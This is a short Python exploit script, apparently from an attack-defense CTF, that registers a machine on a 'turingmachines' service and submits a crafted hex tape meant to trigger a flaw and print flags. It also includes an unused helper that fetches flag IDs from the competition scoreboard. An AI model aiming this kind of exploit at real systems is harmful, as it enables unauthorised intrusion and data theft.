#!/usr/bin/env python3

import json
import random
import requests
import string
import sys
from bs4 import BeautifulSoup
from hashlib import md5

# CHANGE THESE
service_name = 'turingmachines'
service_port = 2080

# UTILITY FUNCTIONS
randstr = lambda N: ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
randmail = lambda: f"{randstr(8)}@{randstr(8)}.com"

ip = sys.argv[1]
url = f'http://{ip}:{service_port}'

def expl(flag_id=None):
    s = requests.Session()
    name = randstr(8)
    mid = s.post(f"{url}/machine/new", data = {
        "name": name,
        "states": open("turing.json", "r").read()
    }).url.split("/")[-1]
    print(s.post(f"{url}/machine/run/{mid}", data = {
        "ident": mid,
        "tape": "003030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030",
        "action": "run"
    }).text, flush=True)
    



def get_flag_ids():
    r = requests.get('https://scoreboard.ctf.saarland/attack.json')
    if r.status_code != 200:
        print(r.text)
        raise RuntimeError("Failed to fetch flag IDs")
    return json.loads(r.text)

expl()